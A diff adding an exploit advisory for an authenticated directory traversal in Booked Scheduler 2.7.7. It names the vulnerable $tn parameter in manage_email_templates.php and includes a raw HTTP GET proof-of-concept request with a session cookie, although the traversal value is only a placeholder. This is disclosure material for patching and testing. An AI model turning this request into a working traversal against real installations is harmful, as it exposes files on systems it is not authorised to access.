@@ -1,0 +1,32 @@
+# Exploit Title: Booked Scheduler 2.7.7 - Authenticated Directory Traversal
+# Date: 2020-05-03
+# Author: Besim ALTINOK
+# Vendor Homepage: https://www.bookedscheduler.com
+# Software Link: https://sourceforge.net/projects/phpscheduleit/
+# Version: v2.7.7
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+Description:
+----------------------------------------------------------
+Vulnerable Parameter: $tn
+Vulnerable File: manage_email_templates.php
+
+
+PoC
+-----------
+
+GET
+/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=vulnerable-parameter&_=1588451710324
+HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 ***************************
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/booked/Web/admin/manage_email_templates.php
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Cookie: new_version=v%3D2.7.7%2Cfs%3D1588451441;
+PHPSESSID=94129ac9414baee8c6ca2f19ab0bcbec
